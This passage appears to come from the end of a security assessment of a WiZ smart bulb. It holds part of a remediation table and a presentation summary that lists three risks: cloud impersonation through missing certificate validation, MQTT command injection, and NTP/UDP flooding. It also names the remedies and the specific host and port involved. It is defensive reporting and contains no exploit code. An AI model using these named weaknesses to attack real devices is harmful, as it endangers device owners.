| 11 | DNS | DoT + fallbacks | Firmware | Medium | Aug 2026 | Open |
| 07 | Optical | Rate-limit toggle | Firmware | Low | Backlog | Open |

---

# Annex B: Presentation Summary

## Core Message
The WiZ bulb's cloud security model is fundamentally undermined by absent server certificate validation. One fix (certificate pinning) closes the majority of the attack surface. The device shows competent local design (privilege separation, secure boot) rendered ineffective by the TLS validation gap.

## Top 3 Risks
1. Cloud impersonation via missing certificate validation (CVSS 7.4)
2. Arbitrary command injection via MQTT topic publishing (CVSS 7.1)
3. Persistent denial of service via combined NTP + UDP flooding (compounded)

## Top 3 Actions
1. Implement certificate pinning for eu.mqtt.wiz.world
2. Sign cloud-to-device MQTT messages with per-device HMAC keys
3. Add rate limiting on UDP 38899 and NTP plausibility checks
